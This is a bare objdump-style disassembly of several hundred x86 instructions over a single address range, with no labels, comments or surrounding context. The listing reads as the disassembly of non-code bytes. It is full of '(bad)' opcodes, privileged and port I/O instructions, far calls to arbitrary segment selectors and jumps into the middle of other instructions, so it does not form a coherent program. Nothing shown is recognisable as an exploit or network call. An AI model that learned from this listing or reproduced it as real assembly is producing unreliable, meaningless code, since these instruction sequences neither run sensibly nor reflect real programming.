  412f76:	call   0x1f8:0xc5c96319
  412f7d:	sbb    DWORD PTR [ebx],ecx
  412f7f:	mov    ah,0xd
  412f81:	cdq    
  412f82:	cmovge ebp,DWORD PTR [ecx+0x7f]
  412f86:	jl     0x412fed
  412f88:	mov    dh,0xa2
  412f8a:	sbb    DWORD PTR [esi+0x3ffd3588],0x6b
  412f91:	jmp    0x7aca:0x5c8fa359
  412f98:	push   es
  412f99:	aad    0x90
  412f9b:	xchg   edi,eax
  412f9d:	pusha  
  412f9e:	xchg   ebx,eax
  412f9f:	stos   BYTE PTR es:[edi],al
  412fa0:	and    ecx,ecx
  412fa2:	lods   eax,DWORD PTR ds:[esi]
  412fa3:	loop   0x412f6d
  412fa5:	mov    WORD PTR [ecx-0x44],ds
  412fa8:	mov    ah,0x2b
  412faa:	cli    
  412fab:	cli    
  412fac:	push   ecx
  412fad:	ret    
  412fae:	adc    ebx,DWORD PTR [ecx]
  412fb0:	sahf   
  412fb1:	cmp    bh,ah
  412fb3:	cmp    esp,DWORD PTR [ebx+0xb]
  412fb6:	adc    al,0x99
  412fb8:	mov    edi,fs
  412fba:	lods   eax,DWORD PTR ds:[esi]
  412fbb:	(bad)  
  412fbc:	out    dx,al
  412fbd:	lds    esi,FWORD PTR [edi+ebp*1]
  412fc0:	jo     0x412f67
  412fc2:	retf   0x5f11
  412fc5:	xchg   ecx,eax
  412fc6:	add    BYTE PTR [ecx+0x590771c4],ch
  412fcc:	jo     0x412f7d
  412fce:	leave  
  412fcf:	push   edx
  412fd0:	lahf   
  412fd1:	jo     0x41302b
  412fd3:	(bad)  [ebx]
  412fd5:	dec    edi
  412fd6:	js     0x413005
  412fd8:	jecxz  0x413046
  412fda:	lock mov gs,WORD PTR [esi]
  412fdd:	ss inc ebp
  412fdf:	test   eax,0xfb702e52
  412fe4:	bound  esi,QWORD PTR [ecx+ebp*1-0x4d]
  412fe8:	rol    eax,0xa5
  412feb:	mov    ah,0x5c
  412fed:	rol    BYTE PTR [esi+0x20],0xc4
  412ff1:	pop    edx
  412ff2:	out    0x29,al
  412ff4:	dec    eax
  412ff5:	sahf   
  412ff6:	mov    ecx,ecx
  412ff8:	popa   
  412ff9:	jl     0x412f9f
  412ffb:	xor    al,BYTE PTR [eax+0x633d2b4c]
  413001:	sbb    eax,esi
  413003:	aad    0x1b
  413005:	sbb    BYTE PTR [edi+eiz*2],ch
  413008:	xor    DWORD PTR [ecx+0x40],ebp
  41300b:	dec    esp
  41300c:	call   0xf040:0xeefb4ae7
  413013:	inc    edi
  413014:	and    DWORD PTR [edi],0xffffffdf
  413017:	add    bh,BYTE PTR [edi+0x6b]
  41301a:	ret    
  41301b:	inc    edi
  41301c:	mov    dh,0x89
  41301e:	test   eax,0x59cf9aea
  413023:	or     dh,al
  413025:	cmpxchg ah,ah
  413028:	mul    BYTE PTR [edx]
  41302a:	push   esi
  41302b:	imul   esp,esp,0xc1a4c964
  413031:	sbb    dh,dh
  413033:	(bad)
  413037:	es data16 test al,0xc3
  41303b:	sub    DWORD PTR [ebx-0x1c1495e7],ebx
  413041:	add    ch,BYTE PTR [ecx]
  413043:	sbb    ah,ah
  413045:	push   ecx
  413046:	ins    DWORD PTR es:[edi],dx
  413047:	adc    edi,DWORD PTR [ebp+0x42]
  41304a:	cli    
  41304b:	dec    ecx
  41304c:	in     al,0xb0
  41304e:	pop    ebp
  41304f:	or     BYTE PTR [ebp+0x4247abbf],ah
  413055:	repz xor eax,0x211737b9
  41305b:	and    al,0x69
  41305d:	enter  0x8dd3,0xa
  413061:	mov    DWORD PTR [ebx-0x14],ecx
  413064:	push   0xffffff8e
  413066:	repnz aad 0xa4
  413069:	sbb    DWORD PTR [esi+0xf],ecx
  41306c:	cmp    ecx,DWORD PTR [edx]
  41306e:	adc    eax,0x526a0bac
  413073:	cmp    al,0xde
  413075:	mov    ebp,0xeb674205
  41307a:	xchg   ebp,eax
  41307b:	call   0x4c3653c4
  413080:	xchg   esp,eax
  413081:	mov    bl,0x66
  413083:	xchg   edx,eax
  413084:	outs   dx,DWORD PTR ds:[esi]
  413085:	lock sbb al,0xaf
  413088:	push   edi
  413089:	xchg   edx,eax
  41308a:	into   
  41308b:	push   ebx
  41308c:	into   
  41308d:	gs ins BYTE PTR es:[edi],dx
  41308f:	clc    
  413090:	sahf   
  413091:	sbb    esi,eax
  413093:	repz and al,0xda
  413096:	sub    bh,BYTE PTR [ebx-0x7ebd49a0]
  41309c:	or     ebp,DWORD PTR [eax+eiz*8+0x69]
  4130a0:	push   edi
  4130a1:	enter  0xda79,0x5e
  4130a5:	das    
  4130a6:	jo     0x41308b
  4130a8:	jl     0x4130cf
  4130aa:	and    ebx,DWORD PTR [esi+0x3b2152d]
  4130b0:	aam    0xc7
  4130b2:	(bad)
  4130b6:	clc    
  4130b7:	ins    BYTE PTR es:[edi],dx
  4130b8:	jbe    0x41305b
  4130ba:	shr    ah,cl
  4130bc:	push   ss
  4130bd:	cwde   
  4130be:	rol    ecx,1
  4130c0:	push   0x37
  4130c2:	jne    0x4130b3
  4130c4:	(bad)  
  4130c5:	cwde   
  4130c6:	cmc    
  4130c7:	inc    eax
  4130c8:	fisub  DWORD PTR [edi]
  4130ca:	xchg   DWORD PTR [eax+0x5635a8c4],eax
  4130d0:	add    BYTE PTR [eax-0x20],0xe0
  4130d4:	xchg   ecx,eax
  4130d5:	mov    ebp,DWORD PTR [edx+0x17]
  4130d8:	mov    ecx,0x7546cb6f
  4130dd:	aas    
  4130de:	outs   dx,BYTE PTR ds:[esi]
  4130df:	sahf   
  4130e0:	jmp    0x991ed3cc
  4130e5:	cmp    edi,esp
  4130e7:	dec    eax
  4130e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130e9:	sub    DWORD PTR [edi+edx*2+0x4b0e6a7f],edi
  4130f0:	sbb    ah,BYTE PTR [ecx-0x4e557dad]
  4130f6:	jae    0x413135
  4130f8:	retf   
  4130f9:	and    al,0xc6
  4130fb:	sbb    bh,BYTE PTR [esi+0x4549c609]
  413101:	jne    0x413116
  413103:	pop    ss
  413104:	ret    0xf73b
  413107:	or     DWORD PTR [ebx-0x518f1f1f],esp
  41310d:	shl    ebx,0x12
  413110:	icebp  
  413111:	sub    BYTE PTR [ecx],bl
  413113:	js     0x4130c5
  413115:	ror    BYTE PTR [si+0x70e5],0x73
  41311b:	and    dh,bl
  41311d:	jno    0x41312e
  41311f:	adc    bl,ch
  413121:	push   esi
  413122:	in     al,dx
  413123:	sub    DWORD PTR [edx],edi
  413125:	hlt    
  413126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413127:	dec    edx
  413128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413129:	or     BYTE PTR [esi],dh
  41312b:	retf   0x1d77
  41312e:	aas    
  41312f:	addr16 in al,0xed
  413132:	sub    al,0xb5
  413134:	iret   
  413135:	mov    ch,ah
  413137:	icebp  
  413138:	dec    esi
  413139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41313a:	push   esi
  41313b:	cdq    
  41313c:	fsubr  DWORD PTR [esi+0x4f53d26e]
  413142:	test   BYTE PTR [ebx],0xdf
  413145:	ds int 0xce
  413148:	xlat   BYTE PTR ds:[ebx]
  413149:	shl    DWORD PTR [esi+edi*1],0x3d
  41314d:	or     cl,BYTE PTR [edi+0xd]
  413150:	sbb    bl,al
  413152:	mov    ebp,0x50dd9331
  413157:	call   0x4bd5c2a6
  41315c:	sub    edx,DWORD PTR [edi]
  41315e:	sbb    edx,edi
  413160:	push   ebx
  413161:	rol    DWORD PTR [ebx-0x74],cl
  413164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413165:	in     eax,dx
  413166:	ret    0xfac7
  413169:	push   ebp
  41316a:	jg     0x41317a
  41316c:	lock ret 0xedc5
  413170:	xchg   DWORD PTR [ebx],edx
  413172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413173:	xor    al,0xf9
  413175:	xor    edx,DWORD PTR [esi+0x4bf2578b]
  41317b:	jbe    0x4131c3
  41317d:	enter  0x78b9,0xe8
  413181:	fwait
  413182:	jns    0x413178
  413184:	(bad)  
  413186:	inc    esi
  413187:	mov    al,ds:0x528896b1
  41318c:	bound  edi,QWORD PTR [ecx]
  41318e:	clc    
  41318f:	push   0x3
  413191:	cld    
  413192:	cmp    DWORD PTR [ebx-0xe583035],eax
  413198:	mov    ebx,0x4c500d22
  41319d:	and    DWORD PTR [edx+0x46cec93],esi
  4131a3:	enter  0x3144,0xdb
  4131a7:	dec    esi
  4131a8:	mov    ebp,0xa9904c4e
  4131ad:	or     al,0x5
  4131af:	sub    cl,BYTE PTR [ecx]
  4131b1:	lea    edx,[ebx-0x7e]
  4131b4:	scas   al,BYTE PTR es:[edi]
  4131b5:	inc    ebp
  4131b6:	pop    ebx
  4131b7:	jmp    0x6e23:0x5d2523c6
  4131be:	inc    ebx
  4131bf:	jle    0x413147
  4131c1:	add    al,0xd4
  4131c3:	xchg   al,dl
  4131c5:	leave  
  4131c6:	(bad)  
  4131c7:	push   esi
  4131c8:	add    al,0x3
  4131ca:	sbb    eax,0x1516257b
  4131cf:	xchg   DWORD PTR [ecx+0x18],ebx
  4131d2:	or     BYTE PTR [esp+ebp*2-0x70cd1ba4],ch
  4131d9:	pushf  
  4131da:	sar    BYTE PTR [edi],0x44
  4131dd:	fistp  DWORD PTR [ebx]
  4131df:	pusha  
  4131e0:	retf   
  4131e1:	icebp  
  4131e2:	dec    ecx
  4131e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131e5:	les    ebx,FWORD PTR [eax-0x7e]
  4131e8:	call   0xde87:0x578a3f30
  4131ef:	jns    0x41322a
  4131f1:	xor    al,BYTE PTR [eax-0x1cbd17fc]
  4131f7:	lods   al,BYTE PTR ds:[esi]
  4131f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131f9:	dec    ebx
  4131fa:	jbe    0x413194
  4131fc:	jo     0x413249
  4131fe:	jbe    0x413203
  413200:	rol    DWORD PTR ds:0x2c760724,1
  413206:	(bad)  [edx+0x4f]
  413209:	pusha  
  41320a:	aam    0x8f
  41320c:	lods   eax,DWORD PTR ds:[esi]
  41320d:	mov    ecx,edi
  41320f:	popa   
  413210:	test   BYTE PTR [ecx+ecx*1+0x594068e2],dh
  413217:	enter  0x4110,0xdf
  41321b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41321c:	dec    esi
  41321d:	jne    0x413264
  41321f:	lods   eax,DWORD PTR es:[esi]
  413221:	mov    bh,0xe3
  413223:	mov    ecx,0xcdad6bbf
  413228:	xlat   BYTE PTR ds:[ebx]
  413229:	mov    ebp,0x5b2d2922
  41322e:	test   BYTE PTR [ecx+0x24c788ae],ah
  413234:	jb     0x41322a
  413236:	in     al,0xc7
  413238:	or     al,ah
  41323a:	xchg   esp,eax
  41323b:	enter  0x6300,0x0
  41323f:	out    0x90,al
  413241:	sub    eax,0x867d5d63
  413246:	iret   
  413247:	(bad)  
  413248:	cmp    dh,BYTE PTR ds:0xeef7623e
  41324e:	je     0x413202
  413250:	cmp    al,0x6b
  413252:	cli    
  413253:	mov    ebp,0xfb8cb0c7
  413258:	push   ebx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	sar    bh,1
  41325c:	ja     0x4132b8
  41325e:	call   0xe82ce25b
  413263:	aad    0xdd
  413265:	push   ebx
  413266:	push   0x66
  413268:	adc    ah,BYTE PTR [edx+0x67]
  41326b:	in     al,dx
  41326c:	outs   dx,DWORD PTR ds:[esi]
  41326d:	cmp    DWORD PTR [eax-0x7729af14],ebp
  413273:	xchg   ebx,eax
  413274:	add    DWORD PTR [esp+edx*4-0x37],0x68289e2f
  41327c:	test   al,0xe
  41327e:	retf   0x4286
  413281:	adc    DWORD PTR [edx+0x6d],ebp
  413284:	jae    0x4132bd
  413286:	cmp    bh,BYTE PTR [edi]
  413288:	clc    
  413289:	sbb    BYTE PTR [edi+0x5c],dl
  41328c:	sbb    ch,bl
  41328e:	mov    ch,0x2d
  413290:	adc    eax,0xb6d9692a
  413295:	jmp    0xde709893
  41329a:	fisub  DWORD PTR [esi]
  41329c:	stos   DWORD PTR es:[edi],eax
  41329d:	and    BYTE PTR [eax-0x68f9d9d2],dl
  4132a3:	inc    edx
  4132a4:	sbb    eax,0xd443b7ac
  4132a9:	es dec edx
  4132ab:	dec    eax
  4132ac:	idiv   BYTE PTR [edx]
  4132ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132af:	ja     0x413236
  4132b1:	jg     0x413266
  4132b3:	icebp  
  4132b4:	in     eax,dx
  4132b5:	xchg   edx,eax
  4132b6:	cmp    cl,BYTE PTR [ecx-0x3]
  4132b9:	ss jno 0x41332b
  4132bc:	mov    al,BYTE PTR ds:0x194ed920
  4132c2:	bnd jae 0x4132da
  4132c5:	out    0xe7,al
  4132c7:	imul   eax,DWORD PTR [edx],0x6d
  4132ca:	cmc    
  4132cb:	push   0xfdc95b07
  4132d0:	aad    0x26
  4132d2:	push   ecx
  4132d3:	jno    0x413334
  4132d5:	aam    0xde
  4132d7:	fcom   QWORD PTR [ebp+edi*2+0x40]
  4132db:	dec    ecx
  4132dc:	dec    ebx
  4132dd:	mov    cl,0x49
  4132df:	into   
  4132e0:	scas   eax,DWORD PTR es:[edi]
  4132e1:	mov    esi,0x6691fd80
  4132e6:	in     eax,dx
  4132e7:	cld    
  4132e8:	fs ins DWORD PTR es:[edi],dx
  4132ea:	xlat   BYTE PTR ds:[ebx]
  4132eb:	fadd   QWORD PTR [ebp-0x1c287cde]
  4132f1:	icebp  
  4132f2:	jl     0x413283
  4132f4:	rcr    BYTE PTR [ebx+0x258202ce],0x56
  4132fb:	cld    
  4132fc:	(bad)  
  4132fd:	adc    eax,0x8f008fae
  413302:	dec    esp
  413303:	pop    eax
  413304:	rcl    DWORD PTR ds:0x498e0a9c,0xf0
  41330b:	add    al,0x4e
  41330d:	jmp    0x2023:0x1486ba80
  413314:	and    DWORD PTR [ebx+0x17c15b69],ebp
  41331a:	add    DWORD PTR [esp+eiz*4+0x1957f199],edx
  413321:	xchg   ebx,eax
  413322:	sub    cl,BYTE PTR [edi+ebx*1]
  413325:	inc    edx
  413326:	mov    BYTE PTR [ebx-0x1e4dad69],ch
  41332c:	cwde   
  41332d:	or     eax,0x734381f
  413332:	mov    ah,0x1e
  413334:	pop    ebx
  413335:	add    BYTE PTR [esi],dh
  413337:	xor    al,0xd9
  413339:	push   edi
  41333a:	fnstenv [edx-0x46cb27b4]
  413340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413341:	retf   0xf3f2
  413344:	xor    al,0xe8
  413346:	xchg   esp,eax
  413347:	ss scas eax,DWORD PTR es:[edi]
  413349:	pop    ds
  41334a:	lahf   
  41334b:	lea    ecx,[ecx-0x11e462fc]
  413351:	fmul   st,st(2)
  413353:	jge    0x413324
  413355:	and    al,0x94
  413357:	push   eax
  413358:	pop    esi
  413359:	out    0x8a,eax
  41335b:	jecxz  0x4132fc
  41335d:	mov    ecx,0xf83cd428
  413362:	jmp    0x413338
  413364:	sbb    eax,0x88dc69c5
  413369:	scas   al,BYTE PTR es:[edi]
  41336a:	jnp    0x413300
  41336c:	push   eax
  41336d:	out    dx,al
  41336e:	nop
  41336f:	les    esp,FWORD PTR [esi+0x64aaa11b]
  413375:	mov    eax,0x209ec6d3
  41337a:	dec    esp
  41337b:	jmp    0x41333c
  41337d:	dec    ebp
  41337e:	jecxz  0x41331b
  413380:	sub    BYTE PTR [edi+0xa1f2a],bl
  413386:	ss adc al,0x3e
  413389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41338a:	or     DWORD PTR [esi-0x38d421e0],0xffffff8e
  413391:	sar    DWORD PTR ds:0x2c3ac292,1
  413397:	jecxz  0x41333a
  413399:	ss jb  0x413387
  41339c:	std    
  41339d:	and    DWORD PTR [edx],esp
  41339f:	pop    ecx
  4133a0:	lahf   
  4133a1:	shl    ah,1
  4133a3:	cld    
  4133a4:	test   DWORD PTR [eax+0x75ae0b29],0xf2cbd50a
  4133ae:	sbb    DWORD PTR ds:0x1058577e,0xffffffa9
  4133b5:	imul   ebp,DWORD PTR [edx+eiz*4-0x6],0x5ee46995
  4133bd:	js     0x41342b
  4133bf:	js     0x41338a
  4133c1:	xchg   ebx,eax
  4133c2:	jae    0x41343c
  4133c4:	shl    BYTE PTR [eax+ecx*8],0xa4
  4133c8:	sbb    cl,al
  4133ca:	xor    DWORD PTR [edi-0x775550bc],edi
  4133d0:	cwde   
  4133d1:	sbb    WORD PTR [eax+0x10],dx
  4133d5:	daa    
  4133d6:	push   esi
  4133d7:	ficomp WORD PTR [ecx]
  4133d9:	push   eax
  4133da:	jae    0x4133b9
  4133dc:	jno    0x413410
  4133de:	jo     0x4133c0
  4133e0:	arpl   bp,cx
  4133e2:	xchg   edx,eax
  4133e3:	and    BYTE PTR [esi-0x4c5b25c2],bh
  4133e9:	lds    esi,FWORD PTR [eax-0x32]
  4133ec:	mov    ch,BYTE PTR [ebx]
  4133ee:	outs   dx,BYTE PTR ds:[esi]
  4133ef:	mov    esp,0x2ad0e43a
  4133f4:	jb     0x41340f
  4133f6:	sti    
  4133f7:	test   BYTE PTR [esi+ebp*2+0x297ffac5],0xdf
  4133ff:	call   0x6bb5f845
  413404:	fidivr DWORD PTR [edi]
  413406:	ror    BYTE PTR [eax+0x472e4b11],cl
  41340c:	push   esp
  41340d:	inc    ecx
  41340e:	cmp    ebp,0x8631ee6
  413414:	and    dl,BYTE PTR [ebx]
  413416:	mov    fs,WORD PTR ds:0x7382247f
  41341c:	imul   ecx,DWORD PTR [ebx+0x3d],0x91e84b15
  413423:	add    eax,0x611547bf
  413428:	inc    eax
  413429:	test   eax,0x7b82f29f
  41342e:	mul    DWORD PTR [ecx-0x44]
  413431:	shl    BYTE PTR [ebx-0x10],1
  413434:	pop    ebx
  413435:	shl    BYTE PTR [edi],0x22
  413438:	and    DWORD PTR [ebx],eax
  41343a:	mov    ah,0xe5
  41343c:	nop
  41343d:	pop    esp
  41343e:	and    eax,0x47178e07
  413443:	test   BYTE PTR [ecx-0x66],0xe7
  413447:	or     DWORD PTR [edx-0x3b],0x29
  41344b:	mov    dl,0xe9
  41344d:	sbb    eax,0xcd801dff
  413452:	cmp    ecx,esi
  413454:	out    0xc6,eax
  413456:	arpl   si,si
  413458:	mov    ebp,0x895db5d7
  41345d:	jmp    0x4133fd
  41345f:	adc    al,0x97
  413461:	sbb    dh,BYTE PTR [ecx]
  413463:	push   ebx
  413464:	push   ecx
  413465:	pop    esi
  413466:	lods   eax,DWORD PTR ds:[esi]
  413467:	rcl    ebp,0x39
  41346a:	cmp    DWORD PTR [eax],esp
  41346c:	mov    bh,0xf2
  41346e:	push   0xffffffc6
  413470:	in     al,0x36
  413472:	mov    ds:0xbee8b38f,eax
  413477:	adc    BYTE PTR [esi],cl
  413479:	int3   
  41347a:	fimul  DWORD PTR [edx-0xf]
  41347d:	lock and eax,0x1d5831bd
  413483:	retf   0x596e
  413486:	daa    
  413487:	sub    al,0x66
  413489:	mov    ah,bh
  41348b:	lahf   
  41348c:	std    
  41348d:	scas   al,BYTE PTR es:[edi]
  41348e:	enter  0x9bf8,0x95
  413492:	dec    edi
  413493:	mov    ecx,0x7a1dd978
  413498:	sbb    al,0x0
  41349a:	cmp    al,0x5d
  41349c:	mov    eax,ds:0xaaaf2b62
  4134a1:	sub    BYTE PTR [eax-0x1960bbbb],dl
  4134a7:	lea    edi,[ebp+0x2dd92e7]
  4134ad:	push   0xffffffc7
  4134af:	xor    edi,DWORD PTR [ebp-0x607ff8d1]
  4134b5:	push   cs
  4134b6:	add    BYTE PTR [esi-0x77f24a5d],ah
  4134bc:	pop    esp
  4134bd:	xor    BYTE PTR [esp+ecx*8],0x81
  4134c1:	das    
  4134c2:	mov    edx,0x6950f1c6
  4134c7:	jb     0x413501
  4134c9:	shl    DWORD PTR [eax+0x45],0x19
  4134cd:	xor    ah,BYTE PTR [edx]
  4134cf:	jno    0x4134d3
  4134d1:	shr    DWORD PTR [ebx-0x1c2d9222],1
  4134d7:	in     eax,0xe
  4134d9:	cmp    ebx,edi
  4134db:	xchg   cx,ax
  4134dd:	jns    0x413515
  4134df:	pop    edi
  4134e0:	fs xchg esp,eax
  4134e2:	xchg   edx,eax
  4134e3:	sbb    DWORD PTR [edx],eax
  4134e5:	cld    
  4134e6:	lods   al,BYTE PTR ds:[esi]
  4134e7:	in     eax,dx
  4134e8:	mov    cs,WORD PTR [eax-0x417c1719]
  4134ee:	rol    ebp,1
  4134f0:	retf   0x1b3d
  4134f3:	out    dx,eax
  4134f4:	repz pop edi
  4134f6:	push   0xffffffa9
  4134f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134f9:	sbb    DWORD PTR [eax],edx
  4134fb:	dec    eax
  4134fc:	icebp  
  4134fd:	pop    edx
  4134fe:	jg     0x413567
  413500:	dec    edx
  413501:	push   0x46feff32
  413506:	sti    
  413507:	icebp  
  413508:	pushf  
  413509:	add    al,0xee
  41350b:	inc    edx
  41350c:	mov    bl,0x9a
  41350e:	sub    DWORD PTR [esi-0x53],edx
  413511:	ins    DWORD PTR es:[edi],dx
  413512:	push   ebx
  413513:	inc    edx
  413514:	sub    ecx,ebx
  413516:	dec    ebp
  413517:	push   ds
  413518:	add    esi,DWORD PTR [ebx]
  41351a:	and    eax,0x4cc98c80
  41351f:	dec    esp
  413520:	inc    esp
  413521:	xor    eax,0x2f1862b4
  413526:	fscale 
  413528:	add    esp,DWORD PTR [edx+0x59]
  41352b:	mov    esp,0xd790b21f
  413530:	in     eax,dx
  413531:	xor    eax,0x95b76901
  413536:	(bad)  
  413537:	jns    0x413522
  413539:	jnp    0x413598
  41353b:	in     eax,dx
  41353c:	jp     0x4134c3
  41353e:	fnstcw WORD PTR [edi]
  413540:	rol    DWORD PTR [ebx],1
  413542:	aas    
  413543:	cmp    dh,bl
  413545:	stos   DWORD PTR es:[di],eax
  413547:	pop    ss
  413548:	(bad)  
  413549:	mov    al,0x92
  41354b:	call   0x90fc:0x80efcd9f
  413552:	jle    0x41357c
  413554:	test   eax,0x55f3f7e9
  413559:	cdq    
  41355a:	cmp    edi,DWORD PTR ds:0xb355253b
  413560:	dec    ebx
  413561:	or     DWORD PTR [esp+esi*4+0x3449eb7a],0xffffffb2
  413569:	das    
  41356a:	mov    dh,0xb5
  41356c:	and    bl,BYTE PTR [ebp-0x3636d09]
  413572:	std    
  413573:	cmp    al,0x1e
  413575:	push   es
  413576:	mov    dl,0x93
  413578:	outs   dx,DWORD PTR ds:[esi]
  413579:	ins    BYTE PTR es:[edi],dx
  41357a:	popa   
  41357b:	push   0xffffffff
  41357d:	sub    BYTE PTR [esi],dh
  41357f:	xchg   ebx,eax
  413580:	and    al,0x71
  413582:	adc    DWORD PTR [esi-0x149fbed9],eax
  413588:	int    0x46
  41358a:	ret    
  41358b:	push   edi
  41358c:	les    edx,FWORD PTR [edi]
  41358e:	in     eax,0x66
  413590:	push   ss
  413591:	pusha  
  413592:	cmp    eax,0x688be0b9
  413597:	adc    ebp,DWORD PTR [eax]
  413599:	pusha  
  41359a:	js     0x4135c1
  41359c:	addr16 lock ds add bh,dh
  4135a1:	mov    esp,0x9b27d78a
  4135a6:	fwait
  4135a7:	cmp    al,cl
  4135a9:	adc    eax,0xf2c97850
  4135ae:	imul   edi,DWORD PTR [edx+0x58],0x78
  4135b2:	ss pop ebp
  4135b4:	aaa    
  4135b5:	sub    bl,BYTE PTR [edi-0x6b7c3c14]
  4135bb:	(bad)  
  4135bc:	jmp    0x141f545
  4135c1:	cmp    eax,0x9a867a01
  4135c7:	sbb    bh,BYTE PTR [edi]
  4135c9:	and    DWORD PTR [ebp-0x1cbf2478],edi
  4135cf:	inc    esp
  4135d0:	test   al,0x5a
  4135d2:	push   edx
  4135d3:	and    cl,bh
  4135d5:	pop    ebp
  4135d6:	mov    ebp,0x81f71612
  4135db:	out    0x11,al
  4135dd:	push   edi
  4135de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135df:	or     ecx,DWORD PTR [edi-0x6a7b4f16]
  4135e5:	cs cmp al,0x2e
  4135e8:	inc    ebp
  4135e9:	cmp    al,0x5c
  4135eb:	arpl   bp,bx
  4135ed:	test   al,0xa1
  4135ef:	pop    eax
  4135f0:	icebp  
  4135f1:	mov    ch,BYTE PTR [esi]
  4135f3:	stos   DWORD PTR es:[edi],eax
  4135f4:	stos   BYTE PTR es:[edi],al
  4135f5:	cmp    esi,ebx
  4135f7:	jae    0x4135a4
  4135f9:	mov    eax,cs
  4135fb:	test   DWORD PTR [edx+0x23],eax
  4135fe:	dec    edi
  4135ff:	xor    edi,DWORD PTR [ebp+0x19]
  413602:	mov    ebp,0x2d3f8ae2
  413607:	mov    BYTE PTR [eiz*2-0x7a8e34df],dl
  41360e:	add    dh,BYTE PTR [ebx+ebx*4+0x6d]
  413612:	shl    eax,0x56
  413615:	xchg   esi,eax
  413616:	int    0xac
  413618:	lods   eax,DWORD PTR ds:[esi]
  413619:	xor    dh,dl
  41361b:	(bad)  
  41361c:	sar    bh,cl
  41361e:	jno    0x4135dc
  413620:	cmp    al,bh
  413622:	adc    BYTE PTR [ebp+0x213c22f3],ah
  413628:	pop    edi
  413629:	(bad)  
  41362a:	mov    WORD PTR ss:[edi-0xa],cs
  41362e:	(bad)  
  41362f:	leave  
  413630:	out    0x86,al
  413632:	ret    
  413633:	pop    ecx
  413634:	mov    al,BYTE PTR [ebx-0x1d]
  413637:	fcom   DWORD PTR [edi-0x704b6718]
  41363d:	and    DWORD PTR [edx+0x9],esp
  413640:	in     al,0x6d
  413642:	jecxz  0x413605
  413644:	sahf   
  413645:	and    bl,BYTE PTR [edi]
  413647:	push   edx
  413648:	jbe    0x413657
  41364a:	xor    BYTE PTR [ebx+edx*2+0x1d],0xa7
  41364f:	ret    
  413650:	xchg   ecx,eax
  413651:	push   edi
  413652:	and    eax,0xaea705e2
  413657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413658:	stos   DWORD PTR es:[edi],eax
  413659:	push   ecx
  41365a:	pop    eax
  41365b:	xor    DWORD PTR [edx-0x5b419484],0xffffffe7
  413662:	inc    edi
  413663:	call   0x8fca:0x70a30b2a
  41366a:	mov    ah,0x99
  41366c:	mov    edi,edi
  41366e:	inc    edx
  41366f:	sahf   
  413670:	mov    bh,0xa9
  413672:	pop    ecx
  413673:	xchg   esp,eax
  413674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413675:	mov    eax,esp
  413677:	sahf   
  413678:	add    al,dl
  41367a:	push   esp
  41367b:	inc    ebx
  41367c:	jne    0x413687
  41367e:	ror    DWORD PTR [edx+0x29],1
  413681:	ss nop
  413683:	adc    ch,BYTE PTR [ecx+0x69b13329]
  413689:	aam    0x8b
  41368b:	enter  0xcbeb,0x21
  41368f:	push   ds
  413690:	push   0xffffffc2
  413692:	je     0x413665
  413694:	push   0x2f
  413696:	xchg   edi,eax
  413697:	jb     0x413631
  413699:	fsubr  QWORD PTR [esi+0x64]
  41369c:	xor    eax,0x81b82862
  4136a1:	add    al,0xd6
  4136a3:	xchg   ebx,eax
  4136a4:	lods   al,BYTE PTR ds:[esi]
  4136a5:	and    cl,bl
  4136a7:	fdivr  DWORD PTR [esi+eiz*2]
  4136aa:	std    
  4136ab:	pop    ss
  4136ac:	sub    al,0x75
  4136ae:	jl     0x413724
  4136b0:	dec    edi
  4136b1:	into   
  4136b2:	xor    eax,DWORD PTR [ebp-0x77]
  4136b5:	repnz mov eax,ds:0x60346057
  4136bb:	in     al,dx
  4136bc:	inc    esi
  4136bd:	mov    BYTE PTR [edx],ah
  4136bf:	daa    
  4136c0:	pop    es
  4136c1:	inc    ebx
  4136c2:	mov    al,BYTE PTR [eax-0x50]
  4136c5:	pop    ecx
  4136c6:	imul   edx,DWORD PTR [ebp-0x76b7b3b8],0x6d
  4136cd:	stos   DWORD PTR es:[edi],eax
  4136ce:	out    0x63,al
  4136d0:	adc    dl,dl
  4136d2:	jo     0x4136ab
  4136d4:	je     0x4136bc
  4136d6:	fadd   QWORD PTR [esi+0x1f]
  4136d9:	mov    edi,0x37ff1553
  4136de:	jmp    0x413700
  4136e0:	ins    BYTE PTR es:[edi],dx
  4136e1:	js     0x413686
  4136e3:	inc    BYTE PTR [edx+0x3c]
  4136e6:	or     BYTE PTR [eax],bh
  4136e8:	das    
  4136e9:	mov    esi,0x6e822664
  4136ee:	xchg   DWORD PTR [ebp-0x55],ecx
  4136f1:	xchg   esi,eax
  4136f2:	mov    esi,0xaf6fa400
  4136f7:	dec    edi
  4136f8:	loope  0x413716
  4136fa:	add    bh,BYTE PTR [esi+0x7c]
  4136fd:	jmp    0x4136b8
  4136ff:	sub    eax,0x82bea423
  413704:	xor    al,0x4b
  413706:	ja     0x4136ad
  413708:	lds    ebx,FWORD PTR [esi]
  41370a:	aam    0xdc
  41370c:	pusha  
  41370d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41370e:	cs xchg ebp,eax
  413710:	pop    ds
  413711:	out    0x64,eax
  413713:	test   BYTE PTR [eax],dh
  413715:	imul   edx,esi,0x2f
  413718:	jg     0x4136ce
  41371a:	dec    esp
  41371b:	ss ja  0x413785
  41371e:	call   0x28ff8507
  413723:	out    0x3d,al
  413725:	gs mov ch,0xda
  413728:	jne    0x41371d
  41372a:	and    al,0xef
  41372c:	cli    
  41372d:	mov    ds:0x2cec7c91,eax
  413732:	sbb    al,0xc6
  413734:	xor    esp,DWORD PTR [ebp+0x19]
